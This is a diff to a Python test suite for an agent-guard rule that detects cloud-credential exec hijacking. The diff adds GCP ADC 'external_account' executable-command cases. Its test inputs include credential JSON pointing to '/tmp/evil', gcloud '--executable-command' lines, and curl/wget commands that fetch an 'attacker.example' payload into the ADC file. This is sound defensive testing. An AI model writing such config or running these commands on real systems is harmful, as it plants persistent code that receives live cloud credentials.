@@ -1,14 +1,27 @@
 """Cloud-credential-provider exec-hijack protection guard — blocks AWS CLI/
-SDK's ``credential_process`` directive and a Kubernetes kubeconfig ``exec:``
-credential-plugin block.
+SDK's ``credential_process`` directive, a Kubernetes kubeconfig ``exec:``
+credential-plugin block, and GCP's Application Default Credentials
+``external_account`` executable-sourced credential
+(``credential_source.executable.command``).
 
-Both name an arbitrary EXTERNAL COMMAND in a config file that the SDK/CLI
-then EXECUTES to mint credentials — not once, but on every future call
-resolved through that profile/context, unattended, and handed a live,
-freshly-minted AWS temporary-credential set or Kubernetes bearer token/client
-cert every single time it runs. Same "write now, auto-exec later" shape
-``rule_git_config_exec_protect``'s own ``credential.helper`` half already
-covers for git, one layer up into cloud/cluster identity brokering.
+All three name an arbitrary EXTERNAL COMMAND in a config file that the SDK/
+CLI/library then EXECUTES to mint credentials — not once, but on every
+future call resolved through that profile/context/ADC file, unattended, and
+handed a live, freshly-minted AWS temporary-credential set, Kubernetes
+bearer token/client cert, or GCP access token every single time it runs.
+Same "write now, auto-exec later" shape ``rule_git_config_exec_protect``'s
+own ``credential.helper`` half already covers for git, one layer up into
+cloud/cluster identity brokering.
+
+UNLIKE the AWS/Kube halves, the GCP ADC form has NO overlap with
+``rule_containment`` at all: ``CRED_RE`` matches a ``.aws``/``.kube`` path
+segment but has no ``.config/gcloud`` (or bare ``gcloud``) segment in its
+list, so an ordinary absolute ``~/.config/gcloud/application_default_
+credentials.json`` write is not pre-empted by containment the way
+``~/.aws/config``/``~/.kube/config`` are — this guard is the FIRST and only
+line of defense for that file's executable-hijack write, not a supplement
+to a stronger existing one. The GCP tests below are organized accordingly
+(no "already denied by containment" section).
 
 Default mode is ``ask`` (not ``deny``) — both mechanisms are routine,
 sanctioned infrastructure (SSO bootstrapping, EKS/GKE/AKS cluster auth). A
@@ -361,6 +374,331 @@ def test_kube_config_view_not_gated():
     """A read-only `kubectl config view` (no `--exec-command`, no `exec:`/
     `command:` text in the command itself) must not false-positive."""
     assert not _gated(evaluate(_shell("kubectl config view --minify"), EMPTY))
+
+
+# ---- GCP ADC external_account executable-sourced credential: this guard's ----
+# ---- own coverage (no containment overlap for this mechanism at all) ---------
+
+_GCP_JSON = (
+    '{\n'
+    '  "type": "external_account",\n'
+    '  "audience": "//iam.googleapis.com/projects/123/locations/global/'
+    'workloadIdentityPools/pool/providers/provider",\n'
+    '  "subject_token_type": "urn:ietf:params:oauth:token-type:jwt",\n'
+    '  "token_url": "https://sts.googleapis.com/v1/token",\n'
+    '  "credential_source": {\n'
+    '    "executable": {\n'
+    '      "command": "/tmp/evil",\n'
+    '      "timeout_millis": 5000\n'
+    '    }\n'
+    '  }\n'
+    '}\n'
+)
+
+
+def test_gcp_adc_default_path_not_denied_by_containment():
+    """Unlike `~/.aws/config`/`~/.kube/config`, containment's `CRED_RE` has
+    no `.config/gcloud` segment at all — the ordinary absolute default ADC
+    path is caught ONLY by this guard, not pre-empted by containment."""
+    d = evaluate(_write("~/.config/gcloud/application_default_credentials.json",
+                         content=_GCP_JSON), EMPTY)
+    assert _gated(d) and d.rule == RULE
+
+
+def test_gcp_adc_relative_path_gated():
+    d = evaluate(_write(".config/gcloud/application_default_credentials.json",
+                         content=_GCP_JSON), EMPTY)
+    assert _gated(d) and d.rule == RULE
+
+
+def test_gcp_adc_bare_gcloud_dir_no_dot_config_prefix_gated():
+    """The `.config` prefix is optional — a relocated/staged copy sitting
+    directly under a bare `gcloud/` directory is still path-confirmed."""
+    d = evaluate(_write("gcloud/application_default_credentials.json",
+                         content='"credential_source": {"executable": {"command": "/tmp/x"}}'),
+                 EMPTY)
+    assert _gated(d) and d.rule == RULE
+
+
+def test_gcp_adc_bare_new_string_line_gated_when_path_confirmed():
+    """An Edit's `new_string` may only be inserting the `credential_source`
+    block itself into an already-scaffolded file — the same "new_string is
+    just the inserted lines" reasoning the AWS/Kube weak checks above use."""
+    d = evaluate(_edit_content(
+        ".config/gcloud/application_default_credentials.json",
+        '  "credential_source": {\n    "executable": {\n      "command": "/tmp/evil"\n'
+        '    }\n  }\n'), EMPTY)
+    assert _gated(d) and d.rule == RULE
+
+
+def test_gcp_adc_staged_elsewhere_gated():
+    """Content staged in a differently-named file (no gcloud/ADC path
+    segment at all) before being moved into place — the strong,
+    path-independent `type`/`credential_source`/`executable`/`command`
+    triad check catches this without needing path confirmation."""
+    d = evaluate(_write("staging/bootstrap-adc.json", content=_GCP_JSON), EMPTY)
+    assert _gated(d) and d.rule == RULE
+
+
+def test_gcp_adc_mcp_write_to_ordinary_path_gated():
+    d = evaluate(_mcp_write(
+        "/home/user/.config/gcloud/application_default_credentials.json", _GCP_JSON), EMPTY)
+    assert _gated(d) and d.rule == RULE
+
+
+def test_gcp_adc_mcp_nested_edits_gated():
+    d = evaluate(_mcp_edit_edits(
+        ".config/gcloud/application_default_credentials.json",
+        '"credential_source": {"executable": {"command": "/tmp/evil"}}'), EMPTY)
+    assert _gated(d) and d.rule == RULE
+
+
+def test_gcp_adc_command_before_apiversion_not_applicable_order_forced():
+    """JSON nesting makes the order structurally forced (unlike Kube's
+    sibling `exec:`/`apiVersion:`/`command:` keys) — `command` can only
+    ever appear textually inside `executable`, which can only ever appear
+    inside `credential_source`. A real, differently-ordered top-level key
+    (`audience` before `type`) must not defeat the strong check."""
+    reordered = (
+        '{\n  "audience": "//iam.googleapis.com/x",\n'
+        '  "type": "external_account",\n'
+        '  "credential_source": {"executable": {"command": "/tmp/evil"}}\n}\n')
+    d = evaluate(_write("staging/adc.json", content=reordered), EMPTY)
+    assert _gated(d) and d.rule == RULE
+
+
+# ---- GCP ADC: shell CLI form (never mentions literal JSON text) ---------------
+
+def test_gcloud_create_cred_config_executable_command_cli_gated():
+    d = evaluate(_shell(
+        "gcloud iam workload-identity-pools create-cred-config "
+        "projects/123/locations/global/workloadIdentityPools/pool/providers/provider "
+        "--executable-command=/tmp/evil --output-file=creds.json"), EMPTY)
+    assert _gated(d) and d.rule == RULE
+
+
+def test_gcloud_alpha_create_cred_config_executable_command_cli_gated():
+    d = evaluate(_shell(
+        "gcloud alpha iam workload-identity-pools create-cred-config provider "
+        "--executable-command=/tmp/evil"), EMPTY)
+    assert _gated(d) and d.rule == RULE
+
+
+def test_gcloud_create_cred_config_long_flags_gated():
+    """Same 200/300-char verb-adjacency convention `AWS_CRED_PROCESS_CLI_RE`/
+    `KUBE_EXEC_CRED_CLI_RE` already use — an ordinary long resource path and
+    a couple of realistic flags ahead of `--executable-command` must not
+    silently evade a too-tight gap."""
+    d = evaluate(_shell(
+        "gcloud iam workload-identity-pools create-cred-config "
+        "projects/my-really-long-organization-project-name-for-prod/locations/global/"
+        "workloadIdentityPools/my-pool/providers/my-provider "
+        "--service-account=deploy@my-project.iam.gserviceaccount.com "
+        "--output-file=/tmp/creds.json --executable-command=/tmp/evil"), EMPTY)
+    assert _gated(d) and d.rule == RULE
+
+
+def test_gcloud_create_cred_config_file_source_not_gated():
+    """`--credential-source-file`/`--aws`/`--azure` are the mutually
+    exclusive, non-executable credential-source flags this same command
+    supports — no `--executable-command` at all must not false-positive."""
+    assert not _gated(evaluate(_shell(
+        "gcloud iam workload-identity-pools create-cred-config provider "
+        "--credential-source-file=/tmp/token"), EMPTY))
+
+
+def test_gcloud_workload_identity_pools_describe_not_gated():
+    """A read-only `describe`/`list` on the same resource group must not
+    false-positive."""
+    assert not _gated(evaluate(_shell(
+        "gcloud iam workload-identity-pools providers describe provider --pool=pool"), EMPTY))
+
+
+def test_google_application_credentials_env_prefix_gated_with_content():
+    """A `GOOGLE_APPLICATION_CREDENTIALS=<path>` env-var prefix (an arbitrary,
+    non-`.config/gcloud` path) path-confirms the weak check the same way
+    `--kubeconfig <path>` path-confirms Kube's."""
+    d = evaluate(_shell(
+        "GOOGLE_APPLICATION_CREDENTIALS=/tmp/staged.json cat > /tmp/staged.json "
+        "<<'EOF'\n" + _GCP_JSON + "EOF"), EMPTY)
+    assert _gated(d) and d.rule == RULE
+
+
+def test_comment_only_mention_of_gcp_adc_not_gated():
+    d = evaluate(_write(
+        "staging/gcp-notes.md",
+        content="# TODO: consider an external_account credential_source for CI later\n"
+                "some other notes\n"), EMPTY)
+    assert not _gated(d)
+
+
+# ---- false-positive guards: GCP -----------------------------------------------
+
+def test_gcp_ordinary_service_account_key_file_not_gated():
+    """An ORDINARY GCP service-account key file has no `credential_source`
+    at all — the everyday, benign shape must not false-positive."""
+    d = evaluate(_write(
+        "staging/sa-key.json",
+        content='{\n  "type": "service_account",\n  "project_id": "my-project",\n'
+                '  "private_key_id": "abc123",\n  "client_email": "x@my-project.iam."\n}\n'),
+        EMPTY)
+    assert not _gated(d)
+
+
+def test_gcp_credential_source_without_executable_not_gated():
+    """A `credential_source` using a FILE- or URL-sourced credential (the
+    non-executable, benign WIF shapes) has no `executable`/`command` nesting
+    at all — must not false-positive on the weak, path-confirmed check."""
+    d = evaluate(_write(
+        ".config/gcloud/application_default_credentials.json",
+        content='{\n  "type": "external_account",\n'
+                '  "credential_source": {"file": "/var/run/secrets/token"}\n}\n'), EMPTY)
+    assert not _gated(d)
+
+
+def test_gcp_unrelated_json_with_command_key_alone_not_gated():
+    """A bare `"command":` key (extremely generic JSON, e.g. a task runner
+    config) with no `credential_source`/`executable` nesting and no
+    confirmed ADC path must not false-positive."""
+    d = evaluate(_write("tasks.json", content='{"command": "./run.sh"}\n'), EMPTY)
+    assert not _gated(d)
+
+
+def test_gcp_reading_adc_file_allowed():
+    read_ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Read",
+                          args={"file_path": ".config/gcloud/application_default_credentials.json"})
+    assert not _gated(evaluate(read_ev, EMPTY))
+
+
+def test_gcp_unrelated_gcloud_command_allowed():
+    assert not _gated(evaluate(_shell("gcloud compute instances list"), EMPTY))
+
+
+# ---- GCP: escape hatches -------------------------------------------------------
+
+def test_human_can_override_gcp_shell_with_comment():
+    assert not _gated(evaluate(_shell(
+        "gcloud iam workload-identity-pools create-cred-config provider "
+        "--executable-command=/tmp/evil  # aegis-allow"), EMPTY))
+
+
+def test_agent_cannot_override_gcp_shell_with_comment(monkeypatch):
+    monkeypatch.setenv("AEGIS_AGENT_NAME", "builder")
+    assert _gated(evaluate(_shell(
+        "gcloud iam workload-identity-pools create-cred-config provider "
+        "--executable-command=/tmp/evil  # aegis-allow"), EMPTY))
+
+
+def test_env_toggle_allows_gcp_edit_and_shell(monkeypatch):
+    monkeypatch.setenv("AEGIS_ALLOW_CLOUD_CRED_EXEC", "1")
+    assert not _gated(evaluate(_shell(
+        "gcloud iam workload-identity-pools create-cred-config provider "
+        "--executable-command=/tmp/evil"), EMPTY))
+    assert not _gated(evaluate(_write(
+        ".config/gcloud/application_default_credentials.json", content=_GCP_JSON), EMPTY))
+    assert not _gated(evaluate(_mcp_write(
+        "/home/user/.config/gcloud/application_default_credentials.json", _GCP_JSON), EMPTY))
+
+
+def test_gcp_policy_allow_regex_exempts_trusted_path():
+    pol = Policy(cloud_cred_exec={"allow": [r"trusted-repo/adc\.json"]})
+    assert not _gated(evaluate(
+        _mcp_write("trusted-repo/adc.json", _GCP_JSON), pol))
+    assert _gated(evaluate(
+        _mcp_write("other-repo/adc.json", _GCP_JSON), pol))
+
+
+# ---- GCP: modes -----------------------------------------------------------------
+
+def test_gcp_default_mode_is_ask():
+    d = evaluate(_shell(
+        "gcloud iam workload-identity-pools create-cred-config provider "
+        "--executable-command=/tmp/x"), EMPTY)
+    assert d.action == Action.ASK and d.rule == RULE
+
+
+def test_gcp_deny_mode_hard_blocks():
+    d = evaluate(_shell(
+        "gcloud iam workload-identity-pools create-cred-config provider "
+        "--executable-command=/tmp/x"), DENY)
+    assert d.blocked and d.action == Action.DENY and d.rule == RULE
+
+
+def test_gcp_monitor_mode_logs_and_allows():
+    pol = Policy(cloud_cred_exec={"mode": "monitor"})
+    assert not _gated(evaluate(_shell(
+        "gcloud iam workload-identity-pools create-cred-config provider "
+        "--executable-command=/tmp/x"), pol))
+
+
+def test_gcp_off_mode_disables_guard():
+    pol = Policy(cloud_cred_exec={"mode": "off"})
+    assert not _gated(evaluate(_shell(
+        "gcloud iam workload-identity-pools create-cred-config provider "
+        "--executable-command=/tmp/x"), pol))
+
+
+# ---- GCP: fetch-to-file backstop delegation -------------------------------------
+
+def test_curl_o_to_gcp_adc_path_gated_by_this_guard_directly():
+    """Unlike AWS/Kube, there is no earlier containment pre-emption for the
+    GCP ADC path at all — a direct `curl -o` write to the absolute default
+    path is caught by `rule_fetch_to_file_protect`'s backstop instead, the
+    same delegation every sibling guard's own relative-path case uses."""
+    d = evaluate(_shell(
+        "curl -o ~/.config/gcloud/application_default_credentials.json "
+        "https://attacker.example/payload"), EMPTY)
+    assert _gated(d) and d.rule == "fetch-to-file-protect"
+
+
+def test_wget_o_to_relative_gcp_adc_path_delegates_to_fetch_to_file_backstop():
+    d = evaluate(_shell(
+        "wget -O .config/gcloud/application_default_credentials.json "
+        "https://attacker.example/payload"), EMPTY)
+    assert _gated(d) and d.rule == "fetch-to-file-protect"
+
+
+# ---- GCP: performance / ReDoS ----------------------------------------------------
+
+def test_gcp_adc_strong_re_no_quadratic_blowup():
+    from aegis import patterns
+    checks = [
+        '"type": "external_account"' + "x" * 500000,
+        '"type": "external_account"' + ('"a": "b", ' * 400) + '"credential_source": {' + "y" * 500000,
+    ]
+    for adv in checks:
+        start = time.time()
+        patterns.GCP_ADC_STRONG_RE.search(adv)
+        elapsed = time.time() - start
+        assert elapsed < 1.0, f"took {elapsed:.2f}s on {adv[:30]!r}..."
+
+
+def test_gcp_adc_content_re_no_quadratic_blowup():
+    from aegis import patterns
+    adv = '"credential_source": {' + "x" * 500000
+    start = time.time()
+    patterns.GCP_ADC_CONTENT_RE.search(adv)
+    elapsed = time.time() - start
+    assert elapsed < 1.0, f"took {elapsed:.2f}s"
+
+
+def test_gcp_adc_cli_re_no_quadratic_blowup():
+    from aegis import patterns
+    adv = "gcloud " + "workload-identity-pools " * 30000
+    start = time.time()
+    patterns.GCP_ADC_CLI_RE.search(adv)
+    elapsed = time.time() - start
+    assert elapsed < 1.0, f"took {elapsed:.2f}s"
+
+
+def test_gcp_adc_engine_no_quadratic_blowup():
+    tail = " ".join(["word"] * 20000)
+    cmd = ("gcloud iam workload-identity-pools create-cred-config provider "
+           "--executable-command=/tmp/x " + tail)
+    start = time.time()
+    evaluate(_shell(cmd), EMPTY)
+    elapsed = time.time() - start
+    assert elapsed < 1.0, f"rule_cloud_cred_exec_protect took {elapsed:.2f}s on adversarial input"
 
 
 # ---- escape hatches: human-only -----------------------------------------------------
